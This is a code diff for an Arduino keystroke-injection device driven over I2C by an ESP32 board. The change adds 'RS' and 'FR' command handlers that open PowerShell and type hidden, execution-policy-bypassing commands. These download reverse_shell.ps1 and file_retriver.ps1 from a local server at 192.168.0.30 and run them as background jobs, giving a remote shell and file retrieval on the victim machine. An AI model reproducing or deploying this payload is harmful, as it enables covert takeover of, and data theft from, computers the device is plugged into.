@@ -1,15 +1,15 @@
 #include <Wire.h>
 #include <Keyboard.h>
-//#include "lib/Keyboard.h"
-// #include "lib/simple-instructions.h"
-//#include "lib/complex-instructions.h"
+// #include "lib/Keyboard.h"
+#include "lib/simple-instructions.h"
+// #include "lib/complex-instructions.h"
 
 const int I2C_MASTER_ADDR = 0x08; // I2C address of the ESP32C6 (C6 board)
 const int ledPin = 13;
 
 void setup()
 {
-  Wire.begin(I2C_MASTER_ADDR);   // Initialize I2C as slave
+  Wire.begin(I2C_MASTER_ADDR);  // Initialize I2C as slave
   Keyboard.begin();             // Initialize the Keyboard library
   Wire.onReceive(receiveEvent); // Register the receive event handler
   Serial.begin(115200);         // Initialize Serial for debugging
@@ -37,11 +37,20 @@ void executeCommand(String command)
 {
   if (command == "RS")
   {
-    Serial.print("Recived command:" + command);
+    openPowerShell();
+    // killall();
+    // openPowerShellAdmin(); 
+    // ========================
+    // These requires custom configuration for deployment
+    // retrive from the server:
+    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/reverse_shell.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
+    Keyboard.println(payload); 
   }
-  else if (command == "ent")
+  else if (command == "FR")
   {
-    Serial.print("Recived command:" + command);
+    openPowerShell();
+    String payload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-WebRequest -Uri 'http://192.168.0.30/file_retriver.ps1' -OutFile 'C:\\Users\\Public\\reverse_shell.ps1'; Start-Job -FilePath 'C:\\Users\\Public\\reverse_shell.ps1'\"";
+    Keyboard.println(payload); 
   }
   else if (command == "typ")
   {
